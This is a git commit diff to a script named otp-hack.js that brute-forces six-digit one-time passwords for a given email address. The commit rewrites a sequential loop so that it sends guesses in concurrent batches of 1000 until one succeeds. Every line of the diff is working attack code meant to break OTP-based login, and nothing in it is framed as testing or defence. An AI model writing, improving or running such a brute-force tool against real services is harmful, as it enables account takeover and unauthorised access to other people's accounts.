1005a421d004eee2e3d05acc75721676fc48d84b
Affan Zahir <Affanzahir26@gmail.com>
2024-10-03 21:18:43 +0500

    trying to do asynchronicaly

--- src/otp-hack.js
+++ src/otp-hack.js
@@ -10,17 +10,39 @@ async function tryOtp(email, otp) {
         console.log(`Success with OTP: ${otp}`, response.data);
         return true; 
     } catch (error) {
-        console.log(`Failed with OTP: ${otp}`);
         return false; 
     }
 }
 
-async function bruteForceOtp(email) {
-    for (let otp = 100000; otp <= 999999; otp++) {
-        const isSuccess = await tryOtp(email, otp.toString());
-        if (isSuccess) {
-            break; 
+async function bruteForceOtp(email, concurrency = 1000) {
+    console.time("Time to find OTP");  
+
+    let otp = 100000;
+    const maxOtp = 999999;
+
+    const sendRequests = async () => {
+        const batch = [];
+        for (let i = 0; i < concurrency && otp <= maxOtp; i++, otp++) {
+            batch.push(tryOtp(email, otp.toString()));
         }
+        return Promise.all(batch);
+    };
+
+    let results = [];
+    while (otp <= maxOtp) {
+        const newResults = await sendRequests();
+        results = results.concat(newResults);
+
+        if (newResults.some(isSuccess => isSuccess)) {
+            console.log('Correct OTP found, stopping further attempts.');
+            console.timeEnd("Time to find OTP");  
+            break;
+        }
+    }
+
+    if (otp > maxOtp) {
+        console.timeEnd("Time to find OTP");  
+        console.log("No correct OTP found.");
     }
 }
 
